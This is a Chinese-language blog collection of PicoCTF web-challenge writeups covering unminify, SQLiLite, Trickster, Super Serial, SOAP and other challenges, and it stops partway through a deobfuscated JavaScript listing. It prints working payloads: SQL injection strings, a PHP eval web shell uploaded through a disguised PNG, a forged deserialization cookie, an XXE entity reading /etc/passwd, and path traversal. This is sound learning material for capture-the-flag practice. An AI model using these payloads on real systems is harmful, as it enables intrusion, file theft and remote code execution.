---
abbrlink: 4f98706e
categories:
    - PicoCTF
cover: https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/upload_4810c93f4ec30864588fcab3bf179d5f.png
date: "2024-06-01T10:27:03+08:00"
mathjax: true
tags:
    - PicoCTF
    - 資安
title: "All-in-One PicoCTF Writeups: Web"
updated: "2024-09-01T20:06:47.030+08:00"
---

# 前言

其實好像也沒什麼好講前言的，但就是不想要一開始就是題目分類，所以還是放了個前言 XD。

自己在刷 PicoCTF 的時候常常發現，幾乎所有的 writeup 都是英文的居多，所以想說來寫個完整一點的中文版！總之呢這裡就是會盡量彙整所有的 picoCTF 的題目在這邊（但是因為已經寫了 60 題左右才開始打算來寫 writeup，所以可能前面的部分會等其他都寫完再來補），如果有需要就可以直接來這邊看所有的 writeup，就這樣啦！希望能幫忙到你。

# unminify

先看題目，點開後他會說如果你打開了這個網頁，代表你的瀏覽器已經收到了 flag，只是他不知道要怎麼讀取它。

![題目](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240701091116470.png)

既然他說了我們瀏覽器已經收到 flag 了，就打開 F12 看一下網頁代碼吧！點開開發者工具後，直接在 Element 的 Tab 裡面用 `Ctrl+F`搜尋 `picoCTF`字串，結果就直接找到了 XD。欸不是這題也太水了吧！

![利用開發者工具搜尋flag](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240701091535175.png)

```txt
picoCTF{pr3tty_c0d3_dbe259ce}
```

# Includes

這個題目給了一個網站，長下面這樣。

![Website](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240929233408223.png)

只有一個東西，沒什麼資訊，只有這個點了 say hello 會有一個 alert。直接點開 F12 先看一下有甚麼 JS 或其他東西，結果發現了 `script.js`，點開看後會發現有半個 Flag。

```javascript
function greetings() {
    alert("This code is in a separate file!");
}

//  f7w_2of2_b8f4b022}
```

然後繼續看會發現還有一個 `style.css`，有前半部的 Flag。

```css
body {
    background-color: lightblue;
}

/*  picoCTF{1nclu51v17y_1of2_  */
```

所以就可以拼出整個 Flag 啦。

```txt
picoCTF{1nclu51v17y_1of2_f7w_2of2_b8f4b022}
```

# picobrowser

這題我們點進 URL 後會看到一個 FLAG 的按鈕，按下去會發現我們不能得到 FLAG。

![題目](https://hackmd.io/_uploads/SJB9S0p70.png)

他說我們應該要是 picobrowser，所以我就寫了一個 selenium 的 Python 腳本來運行，看看能不能拿到 flag。

```python
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
import time

my_user_agent = "picobrowser" # 這裡把agent改為picobrowser
chrome_options = webdriver.ChromeOptions()
chrome_options.add_argument(f"--user-agent={my_user_agent}")
service = Service(executable_path=ChromeDriverManager().install())
driver = webdriver.Chrome(service=service, options=chrome_options)

url = "https://jupiter.challenges.picoctf.org/problem/28921/flag"

driver.get(url)
time.sleep(1337)
```

這樣就得到 flag 了！

```txt
picoCTF{p1c0_s3cr3t_ag3nt_84f9c865}
```

# SQLiLite

題目是一個登入頁面。

![題目](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240701092406670.png)

我們先嘗試用 `admin, admin`登入看看。

![Login as admin](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240701092632509.png)

它會說 Login failed，但是我們可以看到它的 SQL 查詢語句是

```sqlite
SELECT * FROM users WHERE name='admin' AND password='admin'
```

所以我們就可以很輕鬆的用 SQL Injection 啦！這邊使用帳號 `' OR 1=1--`登入就可以啦，密碼不用輸入，或是隨便輸入也行。

![Logged in](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240701093002857.png)

但是他說 flag 在 plainsight 裡面所以我們看不見，那就打開開發者工具用 `Ctrl+F`搜尋吧！

![flag](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240701093133835.png)

```txt
picoCTF{L00k5_l1k3_y0u_solv3d_it_d3c660ac}
```

# More SQLi

把題目 launch 了之後會進入到一個登入頁面，如下圖。

![題目](https://hackmd.io/_uploads/BySNOmYUC.png)

然後我們先嘗試使用 `admin`作為帳號密碼登入。帳號密碼都輸入 `admin`後按下登入，網頁會渲染一個我們剛剛輸入的帳號密碼，以及後台的使用者資訊的查詢語句，如下。

![](https://hackmd.io/_uploads/r1wnu7KIR.png)

圖片有點小，總之他顯示的內容就是像下面這樣:

```txt
username: admin
password: admin
SQL query: SELECT id FROM users WHERE password = 'admin' AND username = 'admin'
```

所以我們在這邊把密碼用 `'OR 1=1 --`這串 payload 作為輸入（帳號可以隨便輸入），整個 SQL 的 query 就會變成這樣:

```sql=
SELECT id FROM users WHERE password = ''OR 1=1 --' AND username = 'admin'
```

可以從上面的代碼高亮的顏色發現，在 `1=1`後面的東西都被註解掉了，所以就可以直接登入系統啦！登入後會看到以下的介面:

![](https://hackmd.io/_uploads/rJjw6XYUC.png)

他可以查詢 City 的名稱，但其實一筆資料包含了 City, Address, Phone。分析一下後台可能的 SQL 語句，應該是如下:

```sql=
SELECT city, address, phone FROM {TABLE_NAME} WHERE city = '';
```

再來因為題目有告訴我們系統使用的是 SQLite，所以會有一個叫做 `sqlite_master`的表來儲存一些表格的各種資訊。（[資訊來源](https://blog.csdn.net/luoshabugui/article/details/108327936)）

知道這些候我們輸入 `' UNION SELECT name, sql, 1337 FROM sqlite_master; --`讓整個 SQL 語句變成如下

```sql=
SELECT city, address, phone FROM {TABLE_NAME} WHERE city = '' UNION SELECT name, sql, 1337 FROM sqlite_master; --';
```

這邊我們使用聯集合併兩個查詢結果，因為第一個結果為空集合，所以返回的結果就會是 sqlite_master 的表格內容，如下:

![找到flag所在的表格了](https://hackmd.io/_uploads/BysgmNY8R.png)

我們可以看到被紅色框框圈住的地方就是我們所想獲得的 flag，既然知道表格名稱，也知道表格的結構了，就把它查詢出來吧！使用這段 payload `' UNION SELECT 1, flag, 1 FROM more_table; --`。輸入後就可以看到以下的介面啦！

![flag](https://hackmd.io/_uploads/SyoSNNtLA.png)

flag 就找到囉！

```txt
picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_78d0583a}
```

# Trickster

這題的題目是一個可以上傳 png 的網頁，看起來就是文件上傳漏洞，頁面如下:

![題目](https://hackmd.io/_uploads/HkocKNtIA.png)

~~秉持著不知道要幹嘛的時候先掃路徑的精神~~，可以找到它的 robots.txt，它其中禁止了兩個路徑，如下:

```txt
User-agent: *
Disallow: /instructions.txt
Disallow: /uploads/
```

既然它都禁止了，我們就去看看吧 XD。`/uploads/`應該就是它的上傳後的文件路徑了，而它 instructions.txt 的內容如下:

```txt
Let's create a web app for PNG Images processing.
It needs to:
Allow users to upload PNG images
	look for ".png" extension in the submitted files
	make sure the magic bytes match (not sure what this is exactly but wikipedia says that the first few bytes contain 'PNG' in hexadecimal: "50 4E 47" )
after validation, store the uploaded files so that the admin can retrieve them later and do the necessary processing.
```

所以我們知道後端驗證檔案是否為 png 的方法有二，其一為檢查文件後綴名是否為 `.png`；其二為驗證文件的 magic bytes，看文件在十六進制中的前幾個位元組是否為 `50 4E 47`。

知道了這些信息後，我們先隨便找一張 png 圖片上傳看看吧！（我這邊直接隨便截圖，並命名為 `hack.png`）。並且在 upload 的過程中用 Burp suite 去攔截封包，並修改其中的檔案名稱及檔案內容。這邊把檔案名稱改為 `hack.png.php`，並在檔案內容的 PNG 以下添加這個[php 一句話木馬](https://xz.aliyun.com/t/6957?time__1311=n4%2BxnD0DRDyD9iDuDRhxBqOoQRQ40xAK5q5vKx&alichlgref=https%3A%2F%2Fwww.google.com%2F)

```php=
<?php @eval($_POST['shell']);?>
```

整個修改完後如下（點開來看可能會比較清楚）:

![一句話木馬](https://hackmd.io/_uploads/Sy7rFrYU0.png)

上傳完成後，現在這個 shell 就會位於 `a`這個位置上啦。

接下來再用[中國蟻劍](https://github.com/AntSwordProject/antSword)這款工具去連接那個 web shell 就可以啦，連接過程如下:

![輸入連接資訊](https://hackmd.io/_uploads/HJo4cSF8A.png)

連接完成後，就可以直接看一下網站的文件，看到以下這個 `.txt`應該就是 flag 了。

![貌似是flag的文件](https://hackmd.io/_uploads/SyahqSYLR.png)

![flag出來了](https://hackmd.io/_uploads/HJW1sBtI0.png)

於是我們就成功找到了 flag 啦！如下:

```txt
picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_d3ac625b}
```

這邊補充一個知識點，來講一下 `<?php @eval($_POST['shell']);?>`到底是在做啥。但因為我也不是很熟 php，所以我們來看看 ChatGPT 大神是怎麼回答的吧！

> 當然，這段 PHP 代碼的原理是允許遠程執行伺服器上的 PHP 代碼。這是如何工作的：
>
> 1. `<?php` 是 PHP 代碼的開始標記。
> 2. `@eval($_POST['shell']);` 中的 `eval()` 函數執行傳遞給它的字符串作為 PHP 代碼。這裡的代碼來自於 HTTP POST 請求中名為 `shell` 的變量。
> 3. `@` 符號用來抑制任何錯誤信息，這樣用戶不會看到執行過程中產生的任何錯誤。
> 4. 由於這段代碼執行任意 PHP 代碼，它使得伺服器容易受到攻擊，因此屬於一種非常危險的做法。
>
> 簡言之，任何通過 `shell` 變量傳送的代碼都將被伺服器執行，這可以用於各種目的，包括但不限於數據讀取、文件操作等。

然後我後來找到了另一篇 writeup，它的 payload 比較酷，是一個即時執行的 input 框，有興趣可以去看一下[這篇](https://medium.com/@niceselol/picoctf-2024-trickster-af90f7476e18)。

# Super Serial

這題先讀取 `/robots.txt`發現它有一個禁止的路徑為 `/admin.phps`，這似乎代表著它有支持 `.phps`文件。所以可以到 `/index.phps`裡面看它的源代碼。（`phps`為 PHP source）

![index.phps](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240704170553939.png)

題目說 Flag 在 `../flag`中，所以解題的思路就是要想辦法讀取到 `../flag`。先把圖片上的程式碼拿出來分析一下。

```php
<?php
require_once "cookie.php";  # 這裡用到了cookie.php

if (isset($_POST["user"]) && isset($_POST["pass"])) {
    $con = new SQLite3("../users.db");
    $username = $_POST["user"];
    $password = $_POST["pass"];
    $perm_res = new permissions($username, $password);
    if ($perm_res->is_guest() || $perm_res->is_admin()) {
        setcookie("login", urlencode(base64_encode(serialize($perm_res))), time() + 86400 * 30, "/");
        header("Location: authentication.php");  # 這裡重定向到authentication.php
        die();
    } else {
        $msg = '<h6 class="text-center" style="color:red">Invalid Login.</h6>';
    }
}
?>
```

由於可以透過 `.phps`查看原始代碼，所以先去查看 `cookie.phps`和 `authentication.phps`。

authentication.php 如下：

```php
<?php

class access_log
{
	public $log_file;

	function __construct($lf) {
		$this->log_file = $lf;
	}

	function __toString() {
		return $this->read_log();
	}

	function append_to_log($data) {
		file_put_contents($this->log_file, $data, FILE_APPEND);
	}

	function read_log() {
		return file_get_contents($this->log_file);
	}
}

require_once("cookie.php");
if(isset($perm) && $perm->is_admin()){
	$msg = "Welcome admin";
	$log = new access_log("access.log");
	$log->append_to_log("Logged in at ".date("Y-m-d")."\n");
} else {
	$msg = "Welcome guest";
}
?>
```

cookie.php 如下：

```php
<?php
session_start();

class permissions
{
	public $username;
	public $password;

	function __construct($u, $p) {
		$this->username = $u;
		$this->password = $p;
	}

	function __toString() {
		return $u.$p;
	}

	function is_guest() {
		$guest = false;

		$con = new SQLite3("../users.db");
		$username = $this->username;
		$password = $this->password;
		$stm = $con->prepare("SELECT admin, username FROM users WHERE username=? AND password=?");
		$stm->bindValue(1, $username, SQLITE3_TEXT);
		$stm->bindValue(2, $password, SQLITE3_TEXT);
		$res = $stm->execute();
		$rest = $res->fetchArray();
		if($rest["username"]) {
			if ($rest["admin"] != 1) {
				$guest = true;
			}
		}
		return $guest;
	}

        function is_admin() {
                $admin = false;

                $con = new SQLite3("../users.db");
                $username = $this->username;
                $password = $this->password;
                $stm = $con->prepare("SELECT admin, username FROM users WHERE username=? AND password=?");
                $stm->bindValue(1, $username, SQLITE3_TEXT);
                $stm->bindValue(2, $password, SQLITE3_TEXT);
                $res = $stm->execute();
                $rest = $res->fetchArray();
                if($rest["username"]) {
                        if ($rest["admin"] == 1) {
                                $admin = true;
                        }
                }
                return $admin;
        }
}

if(isset($_COOKIE["login"])){
	try{
		$perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
		$g = $perm->is_guest();
		$a = $perm->is_admin();
	}
	catch(Error $e){
		die("Deserialization error. ".$perm);
	}
}

?>
```

可以發現在 `cookie.php`中有以下漏洞：

```php
if (isset($_COOKIE["login"])) {
    try {
        $perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
        $g = $perm->is_guest();
        $a = $perm->is_admin();
    } catch (Error $e) {
        die("Deserialization error. " . $perm);
    }
}
```

這裡的反序列化是不安全的（題目名稱也有提示是和 Serial 有關），如果反序列化失敗，進入到 catch error 裡面，就會把 `$perm`輸出。在 `authentication.php`裡面的 `access_log`這個類中，他定義了 `__toString()`就是讀取並回傳 `log_file`的內容。

所以我們只要建立一個 `login`的 cookie，並輸入錯誤的值，就可以觸發反序列化的錯誤。下圖中我設置了 `login`的值為 `TEST`，成功觸發反序列化錯誤的訊息。

![Deserialization error](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240706160307961.png)

接著我們用[PHP Sandbox](https://onlinephp.io/)來線上寫一些 php 的程式碼。這邊會這樣寫是因為我們從 `cookie.phps`中可以看到原始碼是先 URL decode 再 Base64 decode，最後才反序列化。所以整個流程就是反過來就對了。

```php
<?php
print(urlencode(base64_encode(serialize("TEST"))))
?>
```

他這邊輸出了 `czo0OiJURVNUIjs%3D`，我們把 cookie 的值修改為這個試試看，能不能正確的輸出 `TEST`。

![PoC](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240706160839984.png)

成功！再來我們只需要 new 一個 access_log 的 class，並且把他的 `$log_file`設定為 `"../flag"`就可以了！Exploit 如下。

```php
<?php

class access_log
{
    public $log_file = "../flag";
}

$payload = new access_log();

print urlencode(base64_encode(serialize($payload)));
?>
```

上面這個代碼執行後會得到

```txt
TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9
```

這個就是我們最終的 Payload 啦，把它貼到 `login`的 cookie 的 value，並在`authentication.php`的頁面重新整理試試看吧。

![Pwned!](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240706161944368.png)

```txt
picoCTF{th15_vu1n_1s_5up3r_53r1ous_y4ll_405f4c0e}
```

# Java Code Analysis!?!

這題稍微大一點，是一個電子書系統。一開始他給了一個登入介面還有一組帳密：帳號 `user`，密碼 `user`。除此之外，也有給源代碼。我們先來看看網頁的樣子。

![Login](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240704143233744.png)

登入後會看到更多的功能，包括閱讀書籍、查詢書籍、查看帳戶等等。登入後的介面如下。

![Home page](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240704143405607.png)

題目告訴我們，這題的 Winning condition 是要讀取到 Flag 的書籍，就可以獲得 Flag 了。但是向上圖所看到的，我們現在是 Free user，而 Flag 這本書只有 Admin 可以閱讀，所以要來想辦法提升權限。

**// TODO**

# IntroToBurp

這題要用到 BurpSuite 來攔截封包。首先先把 Burp 的攔截給打開。

![打開攔截](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240819164944293.png)

接著把 Browser 打開並連接到題目給的 URL。發現是個註冊頁面，先亂填一些東西試試。填完後按下 Register 會發現 Burp 攔截了我們的封包，這邊不用對封包做修改，直接按下 Forward 送過去。接著會跳到一個 OTP 驗證頁面，一樣先隨便輸入一些東西。

![2FA Auth](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240819165409960.png)

接著到 Burp 裡面修改 OTP 的數據，直接把整行刪掉。

![BurpSuite](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240819165507475.png)

刪掉後直接 Forward 把封包送過去就行啦！如果只是留空白按 Submit，還是會發送一個 OTP 的 Data，所以要用 Burp 直接刪掉。就如同題目給的提示一樣。

> Try mangling the request, maybe their server-side code doesn't handle malformed requests very well.

```txt
picoCTF{#0TP_Bypvss_SuCc3$S_e1eb16ed}
```

# Forbidden Paths

題目介紹如下：

> Can you get the flag? We know that the website files live in `/usr/share/nginx/html/` and the flag is at `/flag.txt` but the website is filtering absolute file paths. Can you get past the filter to read the flag?
>
> Additional details will be available after launching your challenge instance.

把題目給的網站點開來看長這樣。

![題目](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/24/8/image_73025f05e72f6debf09b6484921102bd.png)

測試一下上面這些 txt 檔案後後發現就是一個可以讀檔案的程式，既然題目都告訴我們這個網站專案路徑了，那就只需要回推回根目錄就可以了。因為是 `/usr/share/nginx/html/`有四層，那就回去四層前的目錄並讀取 `flag.txt`就可以了。最終 Payload 如下。

```txt
../../../../flag.txt
```

Flag 就跑出來啦！如下。

```txt
picoCTF{7h3_p47h_70_5ucc355_e5a6fcbc}
```

# It is my Birthday

題目敘述

> I sent out 2 invitations to all of my friends for my birthday! I'll know if they get stolen because the two invites look similar, and they even have the same md5 hash, but they are slightly different! You wouldn't believe how long it took me to find a collision. Anyway, see if you're invited by submitting 2 PDFs to my website.

看了敘述後可以發現應該是要上傳兩個具有相同 MD5 Hash 值得 PDF 文件。這邊我們可以直接使用[這個 Github Repo](https://github.com/corkami/collisions/tree/master/examples/free) 裡面的 **md5-1.pdf** 和 **md5-2.pdf**。把這兩個檔案下載下來後上傳到題目的網站就可以了。

```txt
picoCTF{c0ngr4ts_u_r_1nv1t3d_aebcbf39}
```

# Irish-Name-Repo 1

題目敘述

> There is a website running at `a` ([link](https://jupiter.challenges.picoctf.org/problem/39720/)) or [http://jupiter.challenges.picoctf.org:39720](http://jupiter.challenges.picoctf.org:39720). Do you think you can log us in? Try to see if you can login!

所以就是要登入啦。先到 Login 的頁面看看，發現他傳到 `login.php`的參數中有一個 `debug=0`，如下。

![debug=0](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/24/8/image_ca9db2efbbd073e8976545347ab4bac9.png)

所以使用 BurpSuite 打開網頁並修改參數。把 `debug=0`改為 `debug=1`，然後 Forward 請求後會發現傳回來的 debug 訊息。

![Debug Mode](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/24/8/image_00819763eb396b4830a7d6e748ed4e98.png)

既然知道他的 SQL 語句，就可以直接 SQLi 啦。Payload 是 `' OR 1=1--`，順利得到 Flag。

```txt
picoCTF{s0m3_SQL_c218b685}
```

# SOAP

這題根據題目給的提示，是一個 XXE 漏洞。我對於 XXE 沒什麼了解，去參考了[這篇文章](https://ithelp.ithome.com.tw/articles/10339624)，裡面有關於 XXE 比較詳細的介紹。至於這題，先用 BurpSuite 打開去攔截過程中傳送的封包。

打開後網站後，發現點選這三個按鈕都會觸發一個請求。

![題目](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/24/8/image_6e336e2d693ea607f9ddf4ed86ba485e.png)

我們先隨便點一個讓 Burp 抓到他的封包，我們在進一步修改 XML Payload。封包內容長下面這樣。

![封包內容](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/24/8/image_4ebeddb4957c4760a8cdeab8f7c2a778.png)

因為題目有說要讀取 `/etc/passwd`這個路徑，所以我們把封包修改一下變成下面這樣。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [

<!ENTITY ext SYSTEM "file:///etc/passwd">
]>
<data>
	<ID>&ext;</ID>
</data>
```

把請求 Forward 之後，看到網頁上回傳的內容如下。

![Pwned](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/24/8/image_86556b71eb01e19bc33ffcf13bca4794.png)

就成功找到 Flag 啦。

```txt
picoCTF{XML_3xtern@l_3nt1t1ty_0dcf926e}
```

# SQL Direct

這題要連接到 PostgreSQL 的資料庫，先打開 Kali。打開後輸入以下命令連接到資料庫，密碼為`postgres`。

```bash
psql -h saturn.picoctf.net -p 51152 -U postgres pico
```

-   `-h`代表 Host
-   `-p`代表 Port
-   `-U`代表 Username
-   `pico`代表資料庫名稱

連接到後可以先輸入`\d`查看 Tables。

```txt
pico=# \d
         List of relations
 Schema | Name  | Type  |  Owner
--------+-------+-------+----------
 public | flags | table | postgres
(1 row)
```

可以看到有一個叫做`flags`的表，這邊直接用以下命令把資料查詢出來。

```postgresql
SELECT * FROM flags;
```

果然看到 Flag 了。

```txt
picoCTF{L3arN_S0m3_5qL_t0d4Y_73b0678f}
```

# Cookies

打開題目給的網頁後，按下`F12`並進到 Application 裡面查看 Cookies，看到有一個叫做 name 的 cookie，他的 value 是-1，把他的 value 改為 0 試試看，發現頁面變了，顯示 I love snickerdoodle cookies!。那把這個 value 一直往上加，一直試到 18 就會發現 Flag 了。

```txt
picoCTF{3v3ry1_l0v3s_c00k135_cc9110ba}
```

# More Cookies

TODO

# Client-side-again

這題在 F12 後可以看到一個很長很亂的 javascript，他是被混淆處理（obfuscation）過的。先把它給格式化一下，看起來比較舒服。

```javascript
var _0x5a46 = [
    "f49bf}",
    "_again_e",
    "this",
    "Password\x20Verified",
    "Incorrect\x20password",
    "getElementById",
    "value",
    "substring",
    "picoCTF{",
    "not_this",
];
(function (_0x4bd822, _0x2bd6f7) {
    var _0xb4bdb3 = function (_0x1d68f6) {
        while (--_0x1d68f6) {
            _0x4bd822["push"](_0x4bd822["shift"]());
        }
    };
    _0xb4bdb3(++_0x2bd6f7);
})(_0x5a46, 0x1b3);
var _0x4b5b = function (_0x2d8f05, _0x4b81bb) {
    _0x2d8f05 = _0x2d8f05 - 0x0;
    var _0x4d74cb = _0x5a46[_0x2d8f05];
    return _0x4d74cb;
};
function verify() {
    checkpass = document[_0x4b5b("0x0")]("pass")[_0x4b5b("0x1")];
    split = 0x4;
    if (checkpass[_0x4b5b("0x2")](0x0, split * 0x2) == _0x4b5b("0x3")) {
        if (checkpass[_0x4b5b("0x2")](0x7, 0x9) == "{n") {
            if (
                checkpass[_0x4b5b("0x2")](split * 0x2, split * 0x2 * 0x2) ==
                _0x4b5b("0x4")
            ) {
                if (checkpass[_0x4b5b("0x2")](0x3, 0x6) == "oCT") {
                    if (
                        checkpass[_0x4b5b("0x2")](
                            split * 0x3 * 0x2,
                            split * 0x4 * 0x2
                        ) == _0x4b5b("0x5")
                    ) {
                        if (checkpass["substring"](0x6, 0xb) == "F{not") {
                            if (
                                checkpass[_0x4b5b("0x2")](
                                    split * 0x2 * 0x2,
                                    split * 0x3 * 0x2
                                ) == _0x4b5b("0x6")
                            ) {
                                if (
                                    checkpass[_0x4b5b("0x2")](0xc, 0x10) ==
                                    _0x4b5b("0x7")
                                ) {
                                    alert(_0x4b5b("0x8"));
                                }
                            }
                        }
                    }
                }
            }
        }
    } else {
        alert(_0x4b5b("0x9"));
    }
}
```

最重要的訊息在於`verify()`函式裡面，因為他就是負責檢查登入密碼的。那我們要怎麼像是`_0x4b5b("0x0")`這種東西呢？首先我們先把上面這全部的程式碼貼上網頁 F12 的 Console。

![Paste on Console](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240927131226408.png)

然後接著再把變數一個一個輸入進去就可以還原了！如下。

![Deobfuscate](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240927131358856.png)

還原後的程式碼如下。

```javascript
var strlist = [
    "f49bf}",
    "_again_e",
    "this",
    "Password\x20Verified",
    "Incorrect\x20password",
    "getElementById",
    "value",
    "substring",
    "picoCTF{",
    "not_this",
];
(function (_0x4bd822, _0x2bd6f7) {
    var _0xb4bdb3 = function (_0x1d68f6) {
        while (--_0x1d68f6) {
            _0x4bd822["push"](_0x4bd822["shift"]());
        }
    };
    _0xb4bdb3(++_0x2bd6f7);
})(strlist, 0x1b3);
var _0x4b5b = function (_0x2d8f05, _0x4b81bb) {
    _0x2d8f05 = _0x2d8f05 - 0x0;
    var _0x4d74cb = strlist[_0x2d8f05];
    return _0x4d74cb;
};
function verify() {
    checkpass = document["getElementById"]("pass")["value"];
    split = 0x4;
    if (checkpass["substring"](0x0, split * 0x2) == "picoCTF{") {
        if (checkpass["substring"](0x7, 0x9) == "{n") {
            if (
                checkpass["substring"](split * 0x2, split * 0x2 * 0x2) ==
                "not_this"
            ) {
                if (checkpass["substring"](0x3, 0x6) == "oCT") {
                    if (
                        checkpass["substring"](
                            split * 0x3 * 0x2,
                            split * 0x4 * 0x2
                        ) == "f49bf}"
                    ) {
                        if (checkpass["substring"](0x6, 0xb) == "F{not") {
                            if (
                                checkpass["substring"](
                                    split * 0x2 * 0x2,
                                    split * 0x3 * 0x2
                                ) == "_again_e"
                            ) {
                                if (
                                    checkpass["substring"](0xc, 0x10) ==
                                    "_again_e"
                                ) {
                                    alert("Password Verified");
                                }
                            }
                        }
                    }
                }
            }
        }
    } else {
        alert("Incorrect password");
    }
}
```

這樣就可以找到 Flag 啦。

```txt
picoCTF{not_this_again_ef49bf}
```

# Some Assembly Required 1

打開 Devtools 在 Sources 看到有一個 `G82XCw5CX3.js`，先把他打開來看看。

```javascript
const _0x402c = [
    "value",
    "2wfTpTR",
    "instantiate",
    "275341bEPcme",
    "innerHTML",
    "1195047NznhZg",
    "1qfevql",
    "input",
    "1699808QuoWhA",
    "Correct!",
    "check_flag",
    "Incorrect!",
    "./JIFxzHyW8W",
    "23SMpAuA",
    "802698XOMSrr",
    "charCodeAt",
    "474547vVoGDO",
    "getElementById",
    "instance",
    "copy_char",
    "43591XxcWUl",
    "504454llVtzW",
    "arrayBuffer",
    "2NIQmVj",
    "result",
];
const _0x4e0e = function (_0x553839, _0x53c021) {
    _0x553839 = _0x553839 - 0x1d6;
    let _0x402c6f = _0x402c[_0x553839];
    return _0x402c6f;
};
(function (_0x76dd13, _0x3dfcae) {
    const _0x371ac6 = _0x4e0e;
    while (!![]) {
        try {
            const _0x478583 =
                -parseInt(_0x371ac6(0x1eb)) +
                parseInt(_0x371ac6(0x1ed)) +
                -parseInt(_0x371ac6(0x1db)) * -parseInt(_0x371ac6(0x1d9)) +
                -parseInt(_0x371ac6(0x1e2)) * -parseInt(_0x371ac6(0x1e3)) +
                -parseInt(_0x371ac6(0x1de)) * parseInt(_0x371ac6(0x1e0)) +
                parseInt(_0x371ac6(0x1d8)) * parseInt(_0x371ac6(0x1ea)) +
                -parseInt(_0x371ac6(0x1e5));
            if (_0x478583 === _0x3dfcae) break;
            else _0x76dd13["push"](_0x76dd13["shift"]());
        } catch (_0x41d31a) {
            _0x76dd13["push"](_0x76dd13["shift"]());
        }
    }
})(_0x402c, 0x994c3);
let exports;
(async () => {
    const _0x48c3be = _0x4e0e;
    let _0x5f0229 = await fetch(_0x48c3be(0x1e9)),
        _0x1d99e9 = await WebAssembly[_0x48c3be(0x1df)](
            await _0x5f0229[_0x48c3be(0x1da)]()
        ),
        _0x1f8628 = _0x1d99e9[_0x48c3be(0x1d6)];
    exports = _0x1f8628["exports"];
})();
function onButtonPress() {
    const _0xa80748 = _0x4e0e;
    let _0x3761f8 = document["getElementById"](_0xa80748(0x1e4))[
        _0xa80748(0x1dd)
    ];
    for (let _0x16c626 = 0x0; _0x16c626 < _0x3761f8["length"]; _0x16c626++) {
        exports[_0xa80748(0x1d7)](
            _0x3761f8[_0xa80748(0x1ec)](_0x16c626),
            _0x16c626
        );
    }
    exports["copy_char"](0x0, _0x3761f8["length"]),
        exports[_0xa80748(0x1e7)]() == 0x1
            ? (document[_0xa80748(0x1ee)](_0xa80748(0x1dc))[_0xa80748(0x1e1)] =
                  _0xa80748(0x1e6))
            : (document[_0xa80748(0x1ee)](_0xa80748(0x1dc))[_0xa80748(0x1e1)] =
                  _0xa80748(0x1e8));
}
```

看起來是經過混淆（Obfuscation）的 JS 程式碼，先嘗試簡單逆向一下，說是逆向，其實只是簡單的變數重命名 & 16 進制轉 10 進制 XD。重命名後的代碼像下面這樣。

```javascript
const strArr = [
    "value",
    "2wfTpTR",
    "instantiate",
    "275341bEPcme",
    "innerHTML",
    "1195047NznhZg",
    "1qfevql",
    "input",
    "1699808QuoWhA",
    "Correct!",
    "check_flag",
    "Incorrect!",
    "./JIFxzHyW8W",
    "23SMpAuA",
    "802698XOMSrr",
    "charCodeAt",
    "474547vVoGDO",
    "getElementById",
    "instance",
    "copy_char",
    "43591XxcWUl",
    "504454llVtzW",
    "arrayBuffer",
    "2NIQmVj",
    "result",
];
const getStr = function (idx, arg2) {
    idx = idx - 470;
    let tempStr = strArr[idx];
    return tempStr;
};

// This IIFE (Immediately Invoked Function Expression) will shuffle the strArr
(function (arg1, arg2) {
    const func2 = getStr;
    //This is True
    while (!![]) {
        try {
            const tempConst =
                -parseInt(func2(491)) +
                parseInt(func2(493)) +
                -parseInt(func2(475)) * -parseInt(func2(473)) +
                -parseInt(func2(482)) * -parseInt(func2(483)) +
                -parseInt(func2(478)) * parseInt(func2(480)) +
                parseInt(func2(472)) * parseInt(func2(490)) +
                -parseInt(func2(485));
            if (tempConst === arg2) break;
            else arg1["push"](arg1["shift"]());
        } catch (error) {
            arg1["push"](arg1["shift"]());
        }
    }
})(strArr, 627907);
let exports;
(async () => {
    const func3 = getStr;
    let var1 = await fetch(func3(489)),
        var2 = await WebAssembly[func3(479)](await var1[func3(474)]()),
        var3 = var2[func3(470)];
    exports = var3["exports"];
})();
function onButtonPress() {
    const func4 = getStr;
    let var1 = document["getElementById"](func4(484))[func4(477)];
    for (let i = 0; i < var1["length"]; i++) {
        exports[func4(471)](var1[func4(492)](i), i);
    }
    exports["copy_char"](0, var1["length"]),
        exports[func4(487)]() == 1
            ? (document[func4(494)](func4(476))[func4(481)] = func4(486))
            : (document[func4(494)](func4(476))[func4(481)] = func4(488));
